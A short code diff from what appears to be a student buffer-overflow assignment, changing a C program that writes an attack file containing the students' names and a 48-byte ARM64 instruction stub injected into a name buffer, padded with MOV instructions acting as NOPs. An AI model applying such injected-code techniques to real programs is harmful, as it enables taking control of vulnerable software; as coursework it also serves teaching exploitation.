@@ -20,12 +20,13 @@ int main(void)
     /* 1) Open the attack file for binary write */
     f = fopen("dataA", "wb");
 
-
     /* Student names: 24 bytes */
     fprintf(f, "Ben Zhou and Owen Clarke");
 
     /* Terminating null byte: 1 byte */
     putc('\0', f);
+
+    
 
     /* 2) Emit a 48-byte stub into buf[] (and ultimately name[]): */
     pc = NAME_ADDR;  /* at runtime, the stub’s first instr is at NAME_ADDR */
@@ -48,7 +49,7 @@ int main(void)
 
 
     /* e) Pad stub out to 48 bytes with harmless MOV W0,#0 (acts like NOP) */
-    for (; pc < NAME_ADDR + 24; pc += 4) {
+    for (i = 0; i < 15; i++) {
         instr = MiniAssembler_mov(0, 0);
         fwrite(&instr, 4, 1, f);
     }
